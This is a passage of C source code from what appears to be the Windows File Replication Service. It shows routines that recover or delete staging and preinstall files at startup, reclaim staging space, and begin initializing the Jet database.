        FileTimeToString(&FindData.ftLastAccessTime, TimeString);
        DPRINT1(5,"++ Last access time as read from file is %s\n",TimeString);


        //
        // Is this a partially generated staging file?
        //
        FileNameLen = wcslen(FindData.cFileName);
        if ((FileNameLen == GenLen) &&
            (!memcmp(FindData.cFileName,
                    STAGE_GENERATE_PREFIX,
                    GenPrefixLen * sizeof(WCHAR))) &&
              (StrWToGuid(&FindData.cFileName[GenPrefixLen], &Guid))) {
            //
            // Delete the partially generated staging file
            //
            WStatus = FrsForceDeleteFile(FindData.cFileName);
            DPRINT1_WS(0, "++ WARN - FAILED To delete partial stage file %ws.",
                        FindData.cFileName, WStatus);

            if (WIN_SUCCESS(WStatus)) {
                DPRINT1(4, "++ Deleted partial stage file %ws\n", FindData.cFileName);
            }
            //
            // Unreserve its staging space
            //
            Flags = STAGE_FLAG_EXCLUSIVE | STAGE_FLAG_STAGE_MANAGEMENT;
            WStatus = StageAcquire(&Guid, FindData.cFileName, QUADZERO, &Flags, 0, NULL);
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1(4, "++ WARN - %ws is not in the staging table\n",
                        FindData.cFileName);
            } else {
                StageRelease(&Guid, FindData.cFileName, STAGE_FLAG_UNRESERVE, NULL, NULL, NULL);
                DPRINT1(4, "++ Unreserved space for %ws\n", FindData.cFileName);
            }

        //
        // Is this a partially generated compressed staging file?
        //
        } else if ((FileNameLen == GenCompressedLen) &&
            (!memcmp(FindData.cFileName,
                    STAGE_GENERATE_COMPRESSED_PREFIX,
                    GenCompressedPrefixLen * sizeof(WCHAR))) &&
              (StrWToGuid(&FindData.cFileName[GenCompressedPrefixLen], &Guid))) {
            //
            // Delete the partially generated staging file
            //
            WStatus = FrsForceDeleteFile(FindData.cFileName);
            DPRINT1_WS(0, "++ WARN - FAILED To delete partial stage file %ws.",
                        FindData.cFileName, WStatus);

            if (WIN_SUCCESS(WStatus)) {
                DPRINT1(4, "++ Deleted partial stage file %ws\n", FindData.cFileName);
            }
            //
            // Unreserve its staging space
            //
            Flags = STAGE_FLAG_EXCLUSIVE | STAGE_FLAG_STAGE_MANAGEMENT;
            WStatus = StageAcquire(&Guid, FindData.cFileName, QUADZERO, &Flags, 0, NULL);
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1(4, "++ WARN - %ws is not in the staging table\n",
                        FindData.cFileName);
            } else {
                StageRelease(&Guid, FindData.cFileName, STAGE_FLAG_UNRESERVE, NULL, NULL, NULL);
                DPRINT1(4, "++ Unreserved space for %ws\n", FindData.cFileName);
            }

        //
        // Is this a uncompressed staging file?
        //
        } else if ((FileNameLen == FinalLen) &&
                   (!memcmp(FindData.cFileName,
                            STAGE_FINAL_PREFIX,
                            FinalPrefixLen * sizeof(WCHAR))) &&
                   (StrWToGuid(&FindData.cFileName[FinalPrefixLen], &Guid))) {
            //
            // Acquire the staging area entry
            //
            Flags = STAGE_FLAG_EXCLUSIVE | STAGE_FLAG_STAGE_MANAGEMENT;
            WStatus = StageAcquire(&Guid, FindData.cFileName, QUADZERO, &Flags, 0, NULL);
            //
            // No staging area entry; hence no change order. Delete
            // the staging file.
            //
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1(4, "++ WARN - %ws is not in the staging table\n", FindData.cFileName);

                WStatus = FrsForceDeleteFile(FindData.cFileName);
                DPRINT1_WS(0, "++ WARN - FAILED To delete stage file %ws.",
                            FindData.cFileName, WStatus);

                if (WIN_SUCCESS(WStatus)) {
                    DPRINT1(4, "++ Deleted staging %ws\n", FindData.cFileName);
                }

                continue;
            } else {

                //
                // If this entry is marked recovered then we have already
                // been thru this staging dir once before so bail out now unless
                // we had picked up the compressed version of this staging
                // file. In that case just update the flags.
                //
                if (BooleanFlagOn(Flags, STAGE_FLAG_RECOVERED) &&
                    BooleanFlagOn(Flags, STAGE_FLAG_DECOMPRESSED)) {

                    StageRelease(&Guid, FindData.cFileName, 0, NULL, NULL, NULL);
                    break;
                }

                SizeOfFileGenerated.HighPart = FindData.nFileSizeHigh;
                SizeOfFileGenerated.LowPart = FindData.nFileSizeLow;
                if (BooleanFlagOn(Flags, STAGE_FLAG_COMPRESSED)) {
                    StageRelease(&Guid, FindData.cFileName,
                                 STAGE_FLAG_RECOVERED    | STAGE_FLAG_CREATING  |
                                 STAGE_FLAG_DATA_PRESENT | STAGE_FLAG_CREATED   |
                                 STAGE_FLAG_INSTALLING   | STAGE_FLAG_RERESERVE |
                                 STAGE_FLAG_DECOMPRESSED | STAGE_FLAG_COMPRESSED,
                                 &(SizeOfFileGenerated.QuadPart),
                                 NULL,
                                 NULL);
                } else {
                    StageRelease(&Guid, FindData.cFileName,
                                 STAGE_FLAG_RECOVERED    | STAGE_FLAG_CREATING  |
                                 STAGE_FLAG_DATA_PRESENT | STAGE_FLAG_CREATED   |
                                 STAGE_FLAG_INSTALLING   | STAGE_FLAG_RERESERVE |
                                 STAGE_FLAG_DECOMPRESSED,
                                 &(SizeOfFileGenerated.QuadPart),
                                 NULL,
                                 NULL);
                }
                DPRINT1(4, "++ Recovered staging file %ws\n", FindData.cFileName);
            }

            //
            // Is it a compressed staging file?
            //
        } else if ((FileNameLen == FinalCompressedLen) &&
                   (!memcmp(FindData.cFileName,
                            STAGE_FINAL_COMPRESSED_PREFIX,
                            FinalCompressedPrefixLen * sizeof(WCHAR))) &&
                   (StrWToGuid(&FindData.cFileName[FinalCompressedPrefixLen], &Guid))) {
            //
            // Acquire the staging area entry
            //
            Flags = STAGE_FLAG_EXCLUSIVE | STAGE_FLAG_STAGE_MANAGEMENT;
            WStatus = StageAcquire(&Guid, FindData.cFileName, QUADZERO, &Flags, 0, NULL);
            //
            // No staging area entry; hence no change order. Delete
            // the staging file.
            //
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1(4, "++ WARN - %ws is not in the staging table\n", FindData.cFileName);

                WStatus = FrsForceDeleteFile(FindData.cFileName);
                DPRINT1_WS(0, "++ WARN - FAILED To delete stage file %ws.",
                            FindData.cFileName, WStatus);

                if (WIN_SUCCESS(WStatus)) {
                    DPRINT1(4, "++ Deleted staging %ws\n", FindData.cFileName);
                }

                continue;
            } else {
                //
                // If this entry is marked recovered then we have already
                // been thru this staging dir once before so bail out now.
                //
                if (BooleanFlagOn(Flags, STAGE_FLAG_RECOVERED) &&
                    BooleanFlagOn(Flags, STAGE_FLAG_COMPRESSED)) {
                    StageRelease(&Guid, FindData.cFileName, 0, NULL, NULL, NULL);
                    break;
                }
                SizeOfFileGenerated.HighPart = FindData.nFileSizeHigh;
                SizeOfFileGenerated.LowPart = FindData.nFileSizeLow;

                if (BooleanFlagOn(Flags, STAGE_FLAG_DECOMPRESSED)) {
                    StageRelease(&Guid, FindData.cFileName,
                                 STAGE_FLAG_RECOVERED    | STAGE_FLAG_CREATING  |
                                 STAGE_FLAG_DATA_PRESENT | STAGE_FLAG_CREATED   |
                                 STAGE_FLAG_INSTALLING   | STAGE_FLAG_RERESERVE |
                                 STAGE_FLAG_COMPRESSED   | STAGE_FLAG_DECOMPRESSED,
                                 &(SizeOfFileGenerated.QuadPart),
                                 &FindData.ftLastAccessTime,
                                 NULL);
                } else {
                    StageRelease(&Guid, FindData.cFileName,
                                 STAGE_FLAG_RECOVERED    | STAGE_FLAG_CREATING  |
                                 STAGE_FLAG_DATA_PRESENT | STAGE_FLAG_CREATED   |
                                 STAGE_FLAG_INSTALLING   | STAGE_FLAG_RERESERVE |
                                 STAGE_FLAG_COMPRESSED,
                                 &(SizeOfFileGenerated.QuadPart),
                                 &FindData.ftLastAccessTime,
                                 NULL);
                }
                DPRINT1(4, "++ Recovered staging file %ws\n", FindData.cFileName);
            }
        } else {
            DPRINT1(4, "++ %ws is not a staging file\n", FindData.cFileName);
        }
    } while (FindNextFile(SearchHandle, &FindData));

    //
    // Ignore errors in the above loop.
    //
    WStatus = ERROR_SUCCESS;

cleanup:
    if (StagePath) {
        FrsFree(StagePath);
    }

    if (ResetDirectory) {
        //
        // popd -- cd back to the original directory
        //
        if (!SetCurrentDirectory(CurrentDirectory)) {
            DPRINT1_WS(1, "++ WARN - SetCurrentDirectory(%ws);", CurrentDirectory, GetLastError());
        }
    }

    FRS_FIND_CLOSE(SearchHandle);
    return WStatus;
}


DWORD
DbsRecoverPreInstallFiles (
    IN PREPLICA Replica,
    IN DWORD    InstallLen,
    IN DWORD    InstallPrefixLen
)
/*++

Routine Description:

    Recover the preinstall files in the staging area of Replica.

Arguments:

    Replica
    InstallLen          - Length of preinstall file name
    InstallPrefixLen    - Length of prefix of preinstall file

Thread Return Value:

    Win32 Status

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecoverPreInstallFiles:"

    DWORD           Flags;
    DWORD           FileNameLen;
    DWORD           FileAttributes;
    DWORD           WStatus         = ERROR_SUCCESS;
    PWCHAR          PreInstallPath  = NULL;
    PWCHAR          SearchPath      = NULL;
    PWCHAR          DirPath         = NULL;
    HANDLE          SearchHandle    = INVALID_HANDLE_VALUE;
    BOOL            ResetDirectory  = FALSE;
    GUID            Guid;
    WIN32_FIND_DATA FindData;
    WCHAR           CurrentDirectory[MAX_PATH + 1];

    CurrentDirectory[0] = L'\0';
    PreInstallPath = FrsWcsPath(Replica->Root, NTFRS_PREINSTALL_DIRECTORY);
    DPRINT2(4, ":S: Recovering preinstall %ws for %ws\n",
            PreInstallPath, Replica->ReplicaName->Name);

    //
    // Get our current directory
    //
    if (!GetCurrentDirectory(MAX_PATH, CurrentDirectory)) {
        WStatus = GetLastError();
        DPRINT1_WS(1, "++ ERROR - GetCurrentDirectory() for %ws;", Replica->Stage, WStatus);
        goto cleanup;
    }

    //
    // Change directories (for relative file deletes below)
    //
    if (!SetCurrentDirectory(PreInstallPath)) {
        WStatus = GetLastError();
        DPRINT1_WS(1, "++ ERROR - SetCurrentDirectory(%ws);", PreInstallPath, WStatus);
        goto cleanup;
    }
    ResetDirectory = TRUE;

    //
    // Okay to branch to cleanup from here on
    //

    //
    // Open the staging area
    //
    SearchPath = FrsWcsPath(PreInstallPath, L"*.*");
    SearchHandle = FindFirstFile(SearchPath, &FindData);

    if (!HANDLE_IS_VALID(SearchHandle)) {
        WStatus = GetLastError();
        DPRINT1_WS(1, "++ ERROR - FindFirstFile(%ws);", SearchPath, WStatus);
        goto cleanup;
    }

    do {
        DPRINT1(4, "++ Recover preinstall file %ws\n", FindData.cFileName);

        if (FrsIsShuttingDown) {
            WStatus = ERROR_PROCESS_ABORTED;
            goto cleanup;
        }

        //
        // Is this a preinstall file?
        //
        FileNameLen = wcslen(FindData.cFileName);
        if ((FileNameLen == InstallLen) &&
            (!memcmp(FindData.cFileName,
                     PRE_INSTALL_PREFIX,
                     InstallPrefixLen * sizeof(WCHAR))) &&
            (StrWToGuid(&FindData.cFileName[InstallPrefixLen], &Guid))) {
            //
            // Acquire the staging area entry
            //
            Flags = STAGE_FLAG_EXCLUSIVE | STAGE_FLAG_STAGE_MANAGEMENT;
            WStatus = StageAcquire(&Guid, FindData.cFileName, QUADZERO, &Flags, 0, NULL);
            //
            // No staging area entry; hence no change order. Delete
            // the preinstall file.
            //
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1(4, "++ WARN - %ws is not in the staging table\n", FindData.cFileName);

                if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    DirPath = FrsWcsPath(PreInstallPath, FindData.cFileName);
                    WStatus = FrsDeletePath(DirPath,
                                            ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);
                    DirPath = FrsFree(DirPath);
                } else {
                    WStatus = FrsForceDeleteFile(FindData.cFileName);
                }

                DPRINT1_WS(0, "++ WARN - FAILED To delete preinstall file %ws,",
                           FindData.cFileName, WStatus);

                if (WIN_SUCCESS(WStatus)) {
                    DPRINT1(4, "++ Deleted preinstall %ws\n", FindData.cFileName);
                }
                continue;

            } else {
                StageRelease(&Guid, FindData.cFileName, 0, NULL, NULL, NULL);
                DPRINT1(4, "++ Recovered preinstall file %ws\n", FindData.cFileName);
            }
        } else {
            DPRINT1(4, "++ %ws is not a preinstall file\n", FindData.cFileName);
        }
    } while (FindNextFile(SearchHandle, &FindData));

    //
    // Ignore errors in the above loop.
    //
    WStatus = ERROR_SUCCESS;

cleanup:
    if (PreInstallPath) {
        FrsFree(PreInstallPath);
    }
    if (SearchPath) {
        FrsFree(SearchPath);
    }
    if (ResetDirectory) {
        //
        // popd -- cd back to the original directory
        //
        if (!SetCurrentDirectory(CurrentDirectory)) {
            DPRINT1_WS(1, "++ WARN - SetCurrentDirectory(%ws);", CurrentDirectory, GetLastError());
        }
    }

    FRS_FIND_CLOSE(SearchHandle);
    return WStatus;
}

JET_ERR
DbsReclaimStagingSpaceWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it processes a record from the Outbound log table.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx  - A ptr to an outbound log context struct.
    Record    - A ptr to a change order command record.
    Context   - A ptr to the Replica struct we are working on.

Thread Return Value:

    JET_errSuccess if enum is to continue.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsReclaimStagingSpaceWorker:"

    PCHANGE_ORDER_COMMAND   CoCmd   = (PCHANGE_ORDER_COMMAND)Record;
    PREPLICA                Replica = (PREPLICA) Context;

    //
    // Abort enum if shutting down.
    //
    if (FrsIsShuttingDown) {
        return JET_errTermInProgress;
    }

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);

    DPRINT1(4,"Reclaiming staging space for %ws\n", CoCmd->FileName);

    StageDeleteFile(CoCmd, Replica, TRUE);

    return JET_errSuccess;
}


DWORD
DbsReclaimStagingSpace(
    PTHREAD_CTX   ThreadCtx,
    PREPLICA      Replica
    )
/*++

Routine Description:

Arguments:

    ThreadCtx - the thread context for the initial database open.

Return Value:

    An FrsErrorstatus return.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsReclaimStagingSpace:"
    JET_ERR             jerr;
    DWORD               WStatus;
    DWORD               FStatus     = FrsErrorSuccess;
    PREPLICA_THREAD_CTX RtCtx       = NULL;

    DPRINT1(4, ":S: Reclaim staging area before delete for %ws ...\n",Replica->SetName->Name);

    //
    // Alloc a Replica Thread Context.
    //
    // Note: The opened tables in a Replica Thread Context can only be
    // used by the thread where they were opened.
    //
    RtCtx = FrsAllocType(REPLICA_THREAD_TYPE);

    //
    // Open the replica tables.
    //
    jerr = DbsOpenReplicaTables(ThreadCtx, Replica, RtCtx);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0, "++ ERROR - DbsOpenReplicaTables failed:", jerr);
        FStatus = DbsTranslateJetError(jerr, FALSE);
        return FStatus;
    }

    DPRINT1(4, "++ Enumerate the inbound log for %ws\n", Replica->ReplicaName->Name);

    jerr = FrsEnumerateTable(ThreadCtx,
                             &RtCtx->INLOGTable,
                             ILSequenceNumberIndexx,
                             DbsReclaimStagingSpaceWorker,
                             Replica);
    if ((!JET_SUCCESS(jerr)) &&
        (jerr != JET_errNoCurrentRecord) &&
        (jerr != JET_wrnTableEmpty)) {
        DPRINT1_JS(0, "++ ERROR - Enumerating inbound log for %ws : ",
                   Replica->ReplicaName->Name, jerr);
        FStatus = DbsTranslateJetError(jerr, FALSE);

        DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
        goto CLEANUP;
    }

    //
    // Are there any outbound cxtions?
    //

    DPRINT1(4, "++ Enumerate the outbound log for %ws\n", Replica->ReplicaName->Name);

    jerr = FrsEnumerateTable(ThreadCtx,
                             &RtCtx->OUTLOGTable,
                             OLSequenceNumberIndexx,
                             DbsReclaimStagingSpaceWorker,
                             Replica);
    if ((!JET_SUCCESS(jerr)) &&
        (jerr != JET_errNoCurrentRecord) &&
        (jerr != JET_wrnTableEmpty)) {
        DPRINT1_JS(0, "++ ERROR - Enumerating outbound log for %ws : ",
                   Replica->ReplicaName->Name, jerr);
        FStatus = DbsTranslateJetError(jerr, FALSE);

        DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
        goto CLEANUP;
    }

    //
    // Close this replica's tables
    //
    jerr = DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
    DPRINT_JS(0, "++ DbsCloseReplicaTables close error:", jerr);

CLEANUP:

    RtCtx = FrsFreeType(RtCtx);

    return FStatus;
}


DWORD
DbsRecoverStagingAreas (
    PTHREAD_CTX   ThreadCtx
    )
/*++

Routine Description:

    The staging areas are recovered once at startup.

    The staging areas are not recovered if any of the replica sets could
    not be initialized (detected by the existance of a replica set on the
    fault list).

    For each replica set on the active and fault lists {
        Scan the in/outbound log and generate a reservation table of
        possible staging files.
        Delete any per-replica set pre-install files not found above.
    }

    For each replica set on the active and fault lists {
        Scan the staging areas once and comparing with the data above {
            Delete partial staging files not in the generated table
            Delete staging files not in the generated table
            Mark the table entries with corresponding staging files as keepers
        }
    }

    Scan the reservation table and delete entries w/o staging files

Arguments:

    ThreadCtx - the thread context for the initial database open.

Return Value:

    An FrsErrorstatus return.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsRecoverStagingAreas:"
    PREPLICA            Replica;
    PREPLICA            PrevReplica;
    PCXTION             Cxtion;
    PVOID               CxtionKey;
    JET_ERR             jerr;
    DWORD               WStatus;
    GUID                DummyGuid;
    PWCHAR              DummyFile;
    DWORD               GenLen;
    DWORD               GenPrefixLen;
    DWORD               GenCompressedLen;
    DWORD               GenCompressedPrefixLen;
    DWORD               FinalLen;
    DWORD               FinalPrefixLen;
    DWORD               FinalCompressedLen;
    DWORD               FinalCompressedPrefixLen;
    DWORD               InstallLen;
    DWORD               InstallPrefixLen;
    DWORD               FStatus     = FrsErrorSuccess;
    PREPLICA_THREAD_CTX RtCtx       = NULL;
    ULONG               i;
    ULONG               TotalSets;
    PREPLICA            *RecoveryArray;


    DPRINT(4, ":S: Recover staging areas...\n");

    //
    // Needed for identifying the staging files in the staging area
    //
    DummyFile = FrsCreateGuidName(&DummyGuid, STAGE_GENERATE_PREFIX);
    GenLen = wcslen(DummyFile);
    GenPrefixLen = wcslen(STAGE_GENERATE_PREFIX);
    FrsFree(DummyFile);

    DummyFile = FrsCreateGuidName(&DummyGuid, STAGE_GENERATE_COMPRESSED_PREFIX);
    GenCompressedLen = wcslen(DummyFile);
    GenCompressedPrefixLen = wcslen(STAGE_GENERATE_COMPRESSED_PREFIX);
    FrsFree(DummyFile);

    DummyFile = FrsCreateGuidName(&DummyGuid, STAGE_FINAL_PREFIX);
    FinalLen = wcslen(DummyFile);
    FinalPrefixLen = wcslen(STAGE_FINAL_PREFIX);
    FrsFree(DummyFile);

    DummyFile = FrsCreateGuidName(&DummyGuid, STAGE_FINAL_COMPRESSED_PREFIX);
    FinalCompressedLen = wcslen(DummyFile);
    FinalCompressedPrefixLen = wcslen(STAGE_FINAL_COMPRESSED_PREFIX);
    FrsFree(DummyFile);

    DummyFile = FrsCreateGuidName(&DummyGuid, PRE_INSTALL_PREFIX);
    InstallLen = wcslen(DummyFile);
    InstallPrefixLen = wcslen(PRE_INSTALL_PREFIX);
    FrsFree(DummyFile);


    //
    // Build a list of all the known replica sets for recovery processing.
    //
    TotalSets = 0;
    for (i = 0; i < ARRAY_SZ(AllReplicaLists); i++) {
        ForEachListEntry( AllReplicaLists[i], REPLICA, ReplicaList,
            TotalSets += 1;
        );
    }

    if (TotalSets == 0) {
        return FrsErrorSuccess;
    }

    RecoveryArray = FrsAlloc(TotalSets * sizeof(PREPLICA));

    TotalSets = 0;
    for (i = 0; i < ARRAY_SZ(AllReplicaLists); i++) {
        ForEachListEntry( AllReplicaLists[i], REPLICA, ReplicaList,
            // Induction variable pE is of type PREPLICA.
            RecoveryArray[TotalSets] = pE;
            TotalSets += 1;
        );
    }


    //
    // Alloc a Replica Thread Context.
    //
    // Note: The opened tables in a Replica Thread Context can only be
    // used by the thread where they were opened.
    //
    RtCtx = FrsAllocType(REPLICA_THREAD_TYPE);

    //
    // For each replica set scan the inbound and outbound logs and make
    // entries in the stage file reservation table.
    //
    for (i = 0; i < TotalSets; i++) {
        Replica = RecoveryArray[i];

        //
        // Open the replica tables.
        //
        jerr = DbsOpenReplicaTables(ThreadCtx, Replica, RtCtx);
        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0, "++ ERROR - DbsOpenReplicaTables failed:", jerr);
            FStatus = DbsTranslateJetError(jerr, FALSE);
            //
            // Skip the cleanup phase for this replica set.
            //
            RecoveryArray[i] = NULL;
            continue;
        }

        //
        // Enumerate the inbound log
        //
        DPRINT1(4, "++ Enumerate the inbound log for %ws\n", Replica->ReplicaName->Name);
        jerr = FrsEnumerateTable(ThreadCtx,
                                 &RtCtx->INLOGTable,
                                 ILSequenceNumberIndexx,
                                 DbsRecoverStagingAreasInLog,
                                 Replica);
        if ((!JET_SUCCESS(jerr)) &&
            (jerr != JET_errNoCurrentRecord) &&
            (jerr != JET_wrnTableEmpty)) {
            DPRINT1_JS(0, "++ ERROR - Enumerating inbound log for %ws :",
                       Replica->ReplicaName->Name, jerr);
            FStatus = DbsTranslateJetError(jerr, FALSE);
            //
            // Skip the cleanup phase for this replica set.
            //
            RecoveryArray[i] = NULL;
            DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
            continue;
        }

        //
        // Are there any outbound cxtions?
        //
        CxtionKey = NULL;
        while (Cxtion = GTabNextDatum(Replica->Cxtions, &CxtionKey)) {
            if (!Cxtion->Inbound) {
                break;
            }
        }

        //
        // Enumerate the outbound log iff there are outbound cxtions
        //
//        if (Cxtion != NULL) {
            DPRINT1(4, "++ Enumerate the outbound log for %ws\n", Replica->ReplicaName->Name);

            //
            // Set the COMin value to a high value. The enumeration below sets it to
            // the sequence number of the lowest CO in the outbound log.
            //
            Replica->OutLogCOMin = Replica->OutLogSeqNumber;

            jerr = FrsEnumerateTable(ThreadCtx,
                                     &RtCtx->OUTLOGTable,
                                     OLSequenceNumberIndexx,
                                     DbsRecoverStagingAreasOutLog,
                                     Replica);
            if ((!JET_SUCCESS(jerr)) &&
                (jerr != JET_errNoCurrentRecord) &&
                (jerr != JET_wrnTableEmpty)) {
                DPRINT1_JS(0, "++ ERROR - Enumerating outbound log for %ws : ",
                           Replica->ReplicaName->Name, jerr);
                FStatus = DbsTranslateJetError(jerr, FALSE);
                //
                // Skip the cleanup phase for this replica set.
                //
                RecoveryArray[i] = NULL;
                DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
                continue;
            }
//        } else {
//            DPRINT1(4, "++ DO NOT Enumerate the outbound log for %ws; no outbounds\n",
//                    Replica->ReplicaName->Name);
//        }

        //
        // Close this replica's tables
        //
        jerr = DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
        DPRINT_JS(0, "++ DbsCloseReplicaTables close error:", jerr);

        //
        // The staging space reservation table now has entries for every
        // CO in the inlog and outlog of this replica set.  The pre-install
        // dir is unique for each replica set so if we don't find a CO
        // for it then it must be an orphan so delete it.
        //
        WStatus = DbsRecoverPreInstallFiles(Replica, InstallLen, InstallPrefixLen);
        DPRINT1_WS(0, "++ ERROR - Enumerating preinstall area for %ws :",
                   Replica->ReplicaName->Name, WStatus);
    }


    RtCtx = FrsFreeType(RtCtx);

    //
    // For each replica set scan the staging dirs and look for matching entries
    // in the stage file reservation table.
    //
    for (i = 0; i < TotalSets; i++) {
        Replica = RecoveryArray[i];
        if (Replica == NULL) {
            //
            // Pass 1 above failed on this replica set so skip pass 2.
            //
            continue;
        }

        //
        // Enumerate the staging area for this replica
        //
        WStatus = DbsRecoverStagingFiles(Replica,
                                         GenLen,
                                         GenPrefixLen,
                                         GenCompressedLen,
                                         GenCompressedPrefixLen,
                                         FinalLen,
                                         FinalPrefixLen,
                                         FinalCompressedLen,
                                         FinalCompressedPrefixLen);
        DPRINT1_WS(0, "++ ERROR - Enumerating staging area for %ws :",
                   Replica->ReplicaName->Name, WStatus);
    }


    //
    // Release the entries in the staging area table that were not recovered
    //
    if (FRS_SUCCESS(FStatus)) {
        StageReleaseNotRecovered();
    }

cleanup:

    PM_SET_CTR_SERVICE(PMTotalInst, SSInUseKB, StagingAreaAllocated);

    if (StagingAreaAllocated >= StagingLimitInKb) {
        PM_SET_CTR_SERVICE(PMTotalInst, SSFreeKB, 0);
    }
    else {
        PM_SET_CTR_SERVICE(PMTotalInst, SSFreeKB, (StagingLimitInKb - StagingAreaAllocated));
    }

    RecoveryArray = FrsFree(RecoveryArray);

    DPRINT1(4, "++ %dKB of staging area allocation was recovered\n", StagingAreaAllocated);

    return FStatus;
}


DWORD
DbsDBInitialize (
    PTHREAD_CTX   ThreadCtx,
    PBOOL         EmptyDatabase
    )
/*++

Routine Description:

    Internal entrypoint for database and journal initialization from command server.

Arguments:

    ThreadCtx - the thread context for the initial database open.
    EmptyDataBase - True if created a new empty database.

Return Value:

    An FrsErrorstatus return.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDBInitialize:"

    JET_ERR              jerr, jerr1;
    NTSTATUS             Status;
    ULONG                WStatus;
    FRS_ERROR_CODE       FStatus;
    ULONG                i;
    ANSI_STRING          AnsiStr;

    PTABLE_CTX           ConfigTableCtx;
    PJET_TABLECREATE     JTableCreate;
    PRECORD_FIELDS       FieldInfo;
    JET_TABLEID          FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG
    JET_TABLEID          Tid;
    CHAR                 TableName[JET_cbNameMost];

    ServiceStateNames[CNF_SERVICE_STATE_CREATING]       = "CNF_SERVICE_STATE_CREATING";
    ServiceStateNames[CNF_SERVICE_STATE_INIT]           = "CNF_SERVICE_STATE_INIT";
    ServiceStateNames[CNF_SERVICE_STATE_RECOVERY]       = "CNF_SERVICE_STATE_RECOVERY";
    ServiceStateNames[CNF_SERVICE_STATE_RUNNING]        = "CNF_SERVICE_STATE_RUNNING";
    ServiceStateNames[CNF_SERVICE_STATE_CLEAN_SHUTDOWN] = "CNF_SERVICE_STATE_CLEAN_SHUTDOWN";
    ServiceStateNames[CNF_SERVICE_STATE_ERROR]          = "CNF_SERVICE_STATE_ERROR";
    ServiceStateNames[CNF_SERVICE_STATE_TOMBSTONE]      = "CNF_SERVICE_STATE_TOMBSTONE";

    CxtionStateNames[CxtionStateInit]      = "Init     ";
    CxtionStateNames[CxtionStateUnjoined]  = "Unjoined ";
    CxtionStateNames[CxtionStateStart]     = "Start    ";
    CxtionStateNames[CxtionStateStarting]  = "Starting ";
    CxtionStateNames[CxtionStateScanning]  = "Scanning ";
    CxtionStateNames[CxtionStateSendJoin]  = "SendJoin ";
    CxtionStateNames[CxtionStateWaitJoin]  = "WaitJoin ";
    CxtionStateNames[CxtionStateJoined]    = "Joined   ";
    CxtionStateNames[CxtionStateUnjoining] = "Unjoining";
    CxtionStateNames[CxtionStateDeleted]   = "Deleted  ";

    *EmptyDatabase = FALSE;

    //
    // Allocate the FRS system init config record via the fake FrsInitReplica.
    // Give it a name so DPRINTs don't AV.
    //
    FrsInitReplica = FrsAllocType(REPLICA_TYPE);

    FrsInitReplica->ReplicaName = FrsBuildGName((GUID *)FrsAlloc(sizeof(GUID)),
                                                FrsWcsDup(L"<init>"));

    //
    // Set the first columnid in each table's column create struct to Nil which
    // will force FrsOpenTable to load up the Jet Column IDs on the first call.
    // Normally these are set when a table is created but in the case where
    // we start and do not create a table we must load them ourselves.
    //
    for (i=0; i<TABLE_TYPE_INVALID; i++) {
        DBTables[i].rgcolumncreate->columnid = JET_COLUMN_ID_NIL;
    }

    //
    // Report an event if the drive containing the jet database has
    // write cacheing enabled.
    //
    if (FrsIsDiskWriteCacheEnabled(JetPath)) {
        DPRINT1(0, ":S: ERROR - DISK WRITE CACHE ENABLED ON %ws\n", JetPath);
        EPRINT2(EVENT_FRS_DISK_WRITE_CACHE_ENABLED, ComputerName, JetPath);

    } else {
        DPRINT1(4, ":S: Disk write cache is disabled on %ws\n", JetPath);
    }

    /**********************************************************************
    *                                                                     *
    *         O P E N   J E T   D B   &   R E A D   < I N I T >           *
    *                                                                     *
    **********************************************************************/

    //
    // Open the database and get the system init config record.
    // If successfull the Database and Config table are now open
    // and the global GJetInstance is set.
    //
    DPRINT(0,":S: Accessing the database file.\n");
    FStatus = FrsErrorSuccess;
    ConfigTableCtx = &FrsInitReplica->ConfigTable;
    FrsInitReplica->ReplicaNumber = FRS_SYSTEM_INIT_REPLICA_NUMBER;
    ConfigTableCtx->ReplicaNumber = FRS_SYSTEM_INIT_REPLICA_NUMBER;

    jerr = DbsOpenConfig(ThreadCtx, ConfigTableCtx);
    DEBUG_FLUSH();

    if (FrsIsShuttingDown) {
        return FrsErrorShuttingDown;
    }

    if (!JET_SUCCESS(jerr)) {
        //
        // The OpenConfig failed.  Jet was shutdown.  Classify error and
        // recover if possible.
        //

        FStatus = DbsTranslateJetError(jerr, FALSE);

        if ((FStatus == FrsErrorDatabaseCorrupted)    ||
            (FStatus == FrsErrorInternalError)        ||
            (FStatus == FrsErrorJetSecIndexCorrupted) ||
            (FStatus == FrsErrorDatabaseNotFound)) {

            //
            // Database either not there or bad.
            // Delete it Create the initial jet database structure.
            //
            if (FStatus == FrsErrorDatabaseCorrupted) {

                DPRINT(0, ":S: ********************************************************************************\n");
                DPRINT(0, ":S: * This is the case of failure to recover the NTFRS database                    *\n");
                DPRINT(0, ":S: * Save the database file and logs for analysis and stop ntfrs.                 *\n");
                DPRINT(0, ":S: * Then delete the database and restart the service.                            *\n");
                DPRINT(0, ":S: ********************************************************************************\n");

                FRS_ASSERT(!"Frs database is corrupted");
            } else

            if (FStatus == FrsErrorInternalError) {
                DPRINT(0, "Replacing bad database file.\n");
            } else

